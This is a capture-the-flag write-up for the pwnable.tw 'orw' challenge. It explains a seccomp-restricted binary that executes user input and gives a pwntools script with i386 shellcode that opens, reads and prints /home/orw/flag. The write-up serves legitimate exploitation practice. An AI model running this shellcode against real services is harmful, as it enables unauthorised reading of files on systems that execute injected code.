# orw

Read the flag from `/home/orw/flag`.

Only open read write `syscall` are allowed to use.

```
nc chall.pwnable.tw 10001
```

## WP

The title orw means open, read and write.

By disassembling the  executable file we can see the logic of the program.

First it will call a function called `orw_seccomp()`, this function will forbidden most of the `syscall` except open, read and write.

Then the program will read the user input, and then the program will execute the user input.

Since the shell code like opening shell is obviously forbidden by `orw_seccomp()` function, we can use shell codes only including orw operations to read the content of `/home/orw/flag`.

The script is shown below.

```python
from pwn import *
import pwnlib

p = remote('chall.pwnable.tw', 10001)
p.recvuntil(':')

# shellcode = pwnlib.shellcraft.i386.linux.cat('/home/orw/flag')

shellcode = """
xor ecx, ecx;
push ecx;
push 0x67616c66;
push 0x2f77726f;
push 0x2f656d6f;
push 0x682f2f2f;
mov ebx,esp;
xor edx,edx;
mov eax,0x5;
int 0x80;
mov ebx,eax;
mov ecx,esp;
mov edx,0x30;
mov eax,0x3;
int 0x80;
mov eax,0x4;
mov ebx,0x1;
mov edx,0x30;
int 0x80
"""

p.send(asm(shellcode))
print(p.recvall())
```

We can also get the shellcode from `pwnlib` but I can't get the flag through the shellcode from `pwnlib`, so I finally used a shellcode which is searched online. This shellcode takes effect by opening `/home/orw/flag`, read it into memory and write it on the screen. Finally I get the flag.
